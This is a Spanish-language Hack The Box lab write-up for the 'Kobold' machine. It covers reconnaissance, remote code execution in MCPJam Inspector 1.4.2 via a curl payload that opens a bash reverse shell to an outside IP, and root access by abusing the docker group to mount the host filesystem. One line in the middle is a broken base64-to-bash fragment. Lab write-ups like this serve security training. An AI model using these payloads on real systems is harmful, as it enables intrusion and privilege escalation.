# Writeup Kobold - Hack The Box
## 1. Reconocimiento inicial
El primer paso fue realizar un escaneo con nmap a la dirección IP dada para identificar los puertos abiertos. Se encontraron 3 puertos interesantes: 22, 80 y 443. 
```bash
nmap -sV -sC -p- 10.129.16.30
```

Al intentar acceder a la IP directamente del navegador la página no cargaba, lo que indicaba que el servidor usaba virtual hosting. Se añadió en el archivo `/etc/hosts`:
```bash
10.129.16.30 kobold.htb
```

Con esto, la página cargó mostrando Kobold Operations Suite, una plataforma sin funcionalidades aparentes. Como información que podría ser relevante más adelante, se tiene el correo `admin@kobold.htb`.

## 2. Enumeración web
Se intentó hacer enumeración de directorios y subdominios con gobuster, pero no se encontró nada. Luego se empleó ffuf, tanto en HTTP como en HTTPS, sin resultados aparentes. Sin embargo, la enumeración de virtual hosts reveló el subdominio `mcp.kobold.htb`, que se agregó también a `/etc/hosts`.

```bash
# HTTP - directorios
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://kobold.htb/FUZZ -fc 404

# HTTP - subdominios/vhosts
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://kobold.htb -H "Host: FUZZ.kobold.htb" -fc 302,404

# HTTPS - directorios
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://kobold.htb/FUZZ -fc 404 -k

# HTTPS - subdominios/vhosts (este fue el que encontró mcp.kobold.htb)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -fc 302,404 -k
```

Al acceder a la página nueva se encontró una instancia de MCPJam Inspector v.1.4.2, una herramienta de desarrollo para servidores MCP.

## 3. Explotación - RCE en MCPJam Inspector
Se investigó si esta versión tenía vulnerabilidades conocidas simplemente buscando `MCPJam 1.4.2 exploits` y se encontró un PoC de Remote Code Execution. La vulnerabilidad consiste en que el endpoint `/api/mcp/connect` acepta una configuración de servidor MCP en JSON, incluyendo el comando a ejecutar. Al no validar la entrada, permite ejecutar comandos arbitrarios en el sistema.

El servidor redirigía HTTP a HTTPS (301), por lo que se usaron las flags `-L` (seguir redirecciones) y `-k` (ignorar certificado autifirmado). El comando también debía envolverse en `sh -c` para ejecutarse correctamente como comando de shell.

```
curl -L -k https://mcp.kobold.htb/api/mcp/connect \  
 --header "Content-Type: application/json" \  
 --data '{"serverConfig":{"command":"sh","args":["-c","bash -i >& /dev/tcp/10.10.14.252/  
4444 0>&1"],"env":{}},"serverId":"test"}'  
{"success":false,"error":"Connection failed for server test: MCP error -32000: Connection  
closed","details":"MCP error -32000: Connection closed"}
```

Se confirmó el RCE enviando un ping a nuestra máquina y verificando la llegada del paquete ICMP con `tcpdump` en la interfaz `tun0` (VPN de HTB).

```bash
# En Kali
sudo tcpdump -i tun0 icmp

# En el payload
curl -L -k https://mcp.kobold.htb/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{"serverConfig":{"command":"sh","args":["-c","ping -c 1 10.10.14.252"],"env":{}},"serverId":"test"}'

10:51:27.969759 IP kobold.htb > 10.10.14.252: ICMP echo request, id 2761, seq 1, length 64
10:51:27.969795 IP 10.10.14.252 > kobold.htb: ICMP echo reply, id 2761, seq 1, length 64
```

MC4xMC4xNC4yNTIvNDQ0NCAwPiYxCg== | base64 -d | bash"],"env":{}},"serverId":"test"}'

## Escalada de privilegios
### Enumeración post-explotación
Se ejecutó `id` para revisar los grupos del usuario ben:
```bash
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

El grupo operator no es estándar, por lo que se buscaron archivos accesibles por ese grupo con `find / -group operator`.

```bash
find / -group operator 2>/dev/null
```

Esto reveló el directorio `/privatebin-data` con una instancia de PrivateBin. Se intentó leer los pastes almacenados, pero los subdirectorios tenían permisos restringidos y no se pudo extraer contenido útil.

Se buscaron binarios SUID sin resultado relevante:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Con `ss -tlnp` se identificaron los servicios internos:
- `127.0.0.1:8080` - PrivateBin
- `127.0.0.1:3552` - Aplicación SvelteKit
- `127.0.0.1:6274` - MCPJam


### Vector de escalada - Docker group
Con los vectores anteriores agotados, el foco volvió al grupo `operator`. El razonamiento fue el siguiente: un grupo no estándar en un CTF siempre es intencional, y si no otorga acceso directo a archivos útiles, probablemente permite **cambiar a otro grupo más privilegiado**. Se probó:

```bash
newgrp docker
```

Esto funcionó sin pedir contraseña, lo que significa que la configuración de la máquina (definida en `/etc/gshadow` o `/etc/group`) permite que los miembros de `operator` cambien al grupo `docker`. Esto se puede verificar leyendo:

```bash
cat /etc/group | grep docker
```

El grupo **docker** es una misconfiguration crítica conocida: cualquier usuario que pueda comunicarse con el socket `/var/run/docker.sock` tiene efectivamente privilegios de root, porque puede iniciar contenedores que monten el filesystem del host. No es un exploit sofisticado — es un abuso de una funcionalidad legítima de Docker. En auditorías reales esto se reporta como finding crítica.

Se verificaron las imágenes disponibles:
```bash
newgrp docker << 'EOF'
docker images
EOF
```

Habían dos imágenes: `mysql:latest` y `privatebin/nginx-fpm-alpine:2.0.2`.

### Escape de Docker para leer root.txt
Se montó el filesystem raíz del host dentro de un contenedor usando la imagen de MySQL (que corre como root), sobreescribiendo el entrypoint para ejecutar un comando directo:
```bash
sg docker -c "docker run -v /:/hostfs --rm --entrypoint sh mysql:latest -c 'cat /hostfs/root/root.txt'" 
```

Lo que hace este comando paso a paso: 
- `sg docker -c "..."` → ejecuta el comando con el grupo docker activo 
- `docker run` → inicia un contenedor nuevo 
- `-v /:/hostfs` → monta todo el filesystem del host en `/hostfs` dentro del contenedor 
- `--rm` → elimina el contenedor al terminar 
- `--entrypoint sh` → sobreescribe el entrypoint por defecto de la imagen 
- `-c 'cat /hostfs/root/root.txt'` → lee el flag de root directamente 

Dado que el contenedor corre como root y tiene el filesystem del host montado, los permisos del host no aplican.

## Resumen de la cadena de ataque
``` 
Nmap → vhost mcp.kobold.htb → MCPJam RCE → shell como ben → grupo operator → newgrp docker → montar / en contenedor → root.txt
```
## Lecciones clave

- El **virtual hosting** puede esconder subdominios con superficie de ataque importante — siempre enumerar vhosts.
- Los **certificados SSL** y el source de las páginas pueden revelar subdominios sin necesidad de fuerza bruta.
- El grupo **docker** es equivalente a root — en auditorías reales esto es una finding crítica.
- Cuando `newgrp` no funciona en shells no interactivas, `sg` es el equivalente funcional.
- Ante un RCE sin output visible, confirmar ejecución con **pingback + tcpdump** antes de intentar reverse shell.
